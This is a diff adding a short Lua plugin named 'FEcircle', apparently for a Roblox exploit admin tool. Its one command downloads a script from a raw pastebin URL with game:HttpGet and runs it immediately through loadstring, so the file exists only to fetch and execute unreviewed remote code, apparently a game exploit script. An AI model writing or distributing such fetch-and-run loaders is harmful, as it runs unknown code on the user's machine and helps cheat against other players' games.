@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "FEcircle",
+	["PluginDescription"] = "FEcircle",
+	["Commands"] = {
+		["FEcircle"] = {
+			["Description"] = "FEcircle",
+			["Aliases"] = {'FEcircle', 'FEcircle', 'FEcircle'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet("https://pastebin.com/raw/ygwcfXck", true))()
+			end,
+		},
+	},
+}
+
+return Plugin
